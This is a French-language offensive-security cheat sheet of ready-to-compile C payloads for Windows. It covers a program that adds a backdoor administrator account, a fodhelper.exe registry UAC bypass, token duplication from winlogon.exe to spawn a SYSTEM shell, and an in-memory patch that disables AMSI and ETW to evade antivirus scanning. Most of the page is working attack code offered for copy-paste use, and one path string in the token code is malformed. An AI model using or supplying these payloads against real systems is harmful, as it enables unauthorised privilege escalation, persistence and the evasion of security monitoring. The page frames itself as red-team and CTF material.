# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Cette page regroupe des **extraits de code C petits et autonomes** qui sont utiles lors de l'escalade de privilèges locaux sur Windows ou après une exploitation. Chaque payload est conçu pour être **facile à copier-coller**, nécessite uniquement l'API Windows / le runtime C, et peut être compilé avec `i686-w64-mingw32-gcc` (x86) ou `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Ces payloads supposent que le processus dispose déjà des privilèges minimaux nécessaires pour effectuer l'action (par exemple, `SeDebugPrivilege`, `SeImpersonatePrivilege`, ou un contexte d'intégrité moyenne pour un contournement UAC). Ils sont destinés à des **environnements de red-team ou CTF** où l'exploitation d'une vulnérabilité a permis l'exécution de code natif arbitraire.

---

## Ajouter un utilisateur administrateur local
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## Contournement UAC – Détournement de registre `fodhelper.exe` (Intégrité Moyenne → Élevée)
Lorsque le binaire de confiance **`fodhelper.exe`** est exécuté, il interroge le chemin de registre ci-dessous **sans filtrer le verbe `DelegateExecute`**. En plaçant notre commande sous cette clé, un attaquant peut contourner UAC *sans* déposer de fichier sur le disque.

*Chemin de registre interrogé par `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Un PoC minimal qui ouvre un `cmd.exe` avec des privilèges élevés :
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Testé sur Windows 10 22H2 et Windows 11 23H2 (patches de juillet 2025). Le contournement fonctionne toujours car Microsoft n'a pas corrigé le contrôle d'intégrité manquant dans le chemin `DelegateExecute`.*

---

## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Si le processus actuel détient **les deux** privilèges `SeDebug` et `SeImpersonate` (typique pour de nombreux comptes de service), vous pouvez voler le jeton de `winlogon.exe`, le dupliquer et démarrer un processus élevé :
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Pour une explication plus approfondie de son fonctionnement, voir :
{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## Patch AMSI & ETW en mémoire (Évasion de défense)
La plupart des moteurs AV/EDR modernes s'appuient sur **AMSI** et **ETW** pour inspecter les comportements malveillants. Patchant les deux interfaces tôt dans le processus actuel, cela empêche les charges utiles basées sur des scripts (par exemple, PowerShell, JScript) d'être scannées.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Le correctif ci-dessus est local au processus ; le lancement d'un nouveau PowerShell après l'avoir exécuté s'exécutera sans inspection AMSI/ETW.*

---

## Références
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)

{{#include ../../banners/hacktricks-training.md}}
